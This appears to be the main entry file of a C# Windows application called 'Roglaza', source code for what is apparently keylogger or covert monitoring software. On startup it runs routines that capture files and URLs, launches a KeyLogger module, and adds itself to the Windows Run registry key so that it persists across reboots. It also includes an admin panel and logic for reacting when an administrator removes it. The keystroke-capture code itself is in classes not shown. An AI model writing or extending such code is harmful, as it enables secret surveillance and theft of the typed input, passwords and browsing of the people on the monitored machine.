using Microsoft.Win32;
using Roglaza.Classes;
using Roglaza.Forms;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Linq;
using System.Windows.Forms; 
namespace Roglaza
{
    
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        /// 
        [STAThread]


         public static void Main()
        {


            Program.version = "1.5";
            try
            {
                string version = RoglazaHelper.ReadTextFile("version", "1");
                Program.version = version;       
        
                int v = int.Parse(version) + 1;
                if (Application.StartupPath.Contains(@"\bin\Debug"))
                    RoglazaHelper.FileWriteText("version", v.ToString());
                
            }
            catch { }
            try
            {
                Roglaza.Program.LoadSettings();
                RoglazaHelper.FileWriteText("output_path", ProgramSettings.LogsPath + "\\");
               StandAlone_Executables.Execute_Filer(true);
               StandAlone_Executables.Execute_Urler(true);

                KeyLogger.XMain();

                if (Roglaza.Program.WillExit)
                    Application.Exit();
              
            }
            catch(Exception e) { MessageBox.Show(e.Message); }
        }
        static RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
        public static void RunAtStartUp(bool action)
         {
             try
             {

                 if (action)
                     // Add the value in the registry so that the application runs at startup
                     rkApp.SetValue("Roglaza", Application.ExecutablePath);                                     
                 else
                     // Remove the value from the registry so that the application doesn't start
                     rkApp.DeleteValue("Roglaza", false);


             }
             catch { }
         }
     
        public  static void Exec()
        {
            //Main Function
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            //If admin turned the app off
            if (RoglazaInstaller.IsAdminUnistalledMe())
            {
                MessageBox.Show(MessageStrings.GetTurned_off_reactivate_message(), MessageStrings.GetTurned_off_reactivate_message_caption);
                try { System.Diagnostics.Process.Start(RoglazaInstaller.GetRoglazaAPPDataPath()); }catch { }
                RunAtStartUp(false);
                return;
            }

            //Detecting test mode
            AppInfo.TestMode = Application.StartupPath.Contains(@"\Roglaza\bin") || RoglazaHelper.IsExistedFile("testmode");
            RoglazaInstaller.InstallDirectories();
            RunAtStartUp(true);

            bool Force_creat = RoglazaHelper.IsExistedFile(Application.StartupPath + "\\create");             
            if (ProgramSettings.LoadFromFile()|| Force_creat )
            {
                try
                {
                    var f = new FrmAdminPanel();
                     f.ShowDialog(); }
                catch { }
                ProgramSettings.SaveSettings();
            }

        }
        public static void LoadSettings()
        {
            try
            {
                ProgramSettings = new RoglazaSettings();
                ProgramSettings.LoadFromFile();

            }
            catch { }
      }
        public static RoglazaSettings ProgramSettings = new RoglazaSettings();
        public static System.Drawing.Icon icon ;
        internal static string GetExecutablePath()
        {
            return Application.ExecutablePath.ToString();
        }
        internal static string GetWorkingDirectory()
        {
            return Application.StartupPath.ToString()+"\\";

        }

        public static bool WillExit =false;

        public static string version ="1.2";
    }



}
